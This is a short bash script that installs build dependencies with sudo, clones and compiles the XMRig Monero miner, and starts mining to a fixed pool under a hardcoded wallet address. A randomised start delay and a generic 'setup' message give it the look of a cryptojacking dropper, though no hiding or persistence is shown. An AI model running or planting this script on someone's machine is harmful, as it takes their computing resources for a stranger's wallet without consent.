#!/bin/bash
WALLET="82nfTTGkD2yTtGPZENcGCcM6yrgYdWqjbGvU4MpgcDzuXyVTUYkxkS4JcqEm2n73SddJ2QfdYL8JR8keXPsNwZxD872pyBc"
POOL="pool.supportxmr.com:3333"
WORKER="5slbke"

echo "[+] Starting setup..."

install_dependencies() {
    sudo apt update -y && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
}

build_xmrig() {
    git clone https://github.com/xmrig/xmrig.git
    cd xmrig
    mkdir build && cd build
    cmake ..
    make -j$(nproc)
}

start_mining() {
    sleep $((60 + RANDOM % 60))
    ./xmrig -o $POOL -u $WALLET -p $WORKER -k --coin monero
}

if [ -d "xmrig" ]; then
    cd xmrig/build
else
    install_dependencies
    build_xmrig
fi

start_mining
